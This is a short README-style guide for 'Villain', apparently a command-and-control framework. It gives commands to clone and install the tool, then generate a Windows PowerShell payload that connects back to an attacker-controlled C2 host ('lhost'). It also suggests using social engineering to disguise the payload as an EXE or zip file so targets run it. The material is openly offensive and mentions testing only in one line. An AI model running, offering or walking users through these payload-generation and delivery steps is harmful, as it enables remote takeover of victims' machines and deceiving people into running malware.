# Villain

## Clone the Repository

```bash
git clone https://github.com/keralahacker/Villain
cd ./Villain
pip3 install -r requirements.txt
```
## Generate Payload

To generate a payload, use the following command:
```bash
generate os=windows lhost=IP
```
- IP Address: The IP address can be the C2 IP or a port forwarding HOST-IP.

## Payload Details

- Once the payload is generated, it will be in PowerShell format. The attacker can use social engineering techniques to convert the PowerShell script from Villain to an EXE or zip file for executing the payload.

## Testing the Payload

- For testing the payload, use a Windows 10/11 VM with the latest security patches installed.

